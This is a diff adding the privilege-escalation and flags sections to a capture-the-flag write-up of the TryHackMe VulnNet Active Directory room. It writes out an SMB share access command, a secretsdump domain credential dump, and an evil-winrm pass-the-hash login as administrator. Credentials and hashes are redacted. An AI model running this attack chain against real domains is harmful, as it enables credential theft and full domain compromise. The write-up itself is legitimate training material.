@@ -149,7 +149,7 @@ Notice t-skid has read access to NETLOGON and SYSVOL shares which we did have wi
 
 Let's access NETLOGON share with smbclient and see what we've got in there
 ```
-
+smbclient //vulnet.thm/NETLOGON -U t-skid
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)
 
@@ -170,3 +170,39 @@ evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
 
 
 ## Privilege Escalation
+
+Checked groups and realised user a-whitehat belongs to domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket
+![image](https://user-images.githubusercontent.com/68066436/118693532-21ee8c80-b7d9-11eb-9b2d-195be8421d32.png)
+
+Let's dump the hashes with secretsdump
+```
+python3 secretsdump.py -just-dc a-whitehat:<redacted password>@vulnnet-rst.local
+```
+![image](https://user-images.githubusercontent.com/68066436/118694206-d2f52700-b7d9-11eb-9b00-698568e0e87f.png)
+
+What do we do now that we have the administrator's hashes? Erhmmm, let's pass-the-hash using evil-winrm
+```
+evil-winrm -i vulnet.thm -u administrator -H <redacted NTLM hash of administrator>
+```
+![image](https://user-images.githubusercontent.com/68066436/118695296-084e4480-b7db-11eb-8194-300f527f336b.png)
+
+We have successfully escalated our privilege to administrator!!!!!
+
+
+## Flags
+Time to grab the flags
+
+### User Flag:
+Navigate to C:\users\enterprise-core-vn\Desktop\user.txt
+![image](https://user-images.githubusercontent.com/68066436/118696979-d63de200-b7dc-11eb-8d86-a6da70a933aa.png)
+
+### System Flag:
+Navigate to C:\Users\Administrator\Desktop\system.txt
+![image](https://user-images.githubusercontent.com/68066436/118696998-db029600-b7dc-11eb-8f7d-e0673173e282.png)
+
+
+This is the end of my write-up, hope you enjoyed reading....
+
+
+ <script src="https://tryhackme.com/badge/19802"></script>      <script src="https://www.hackthebox.eu/badge/139980"></script>
+
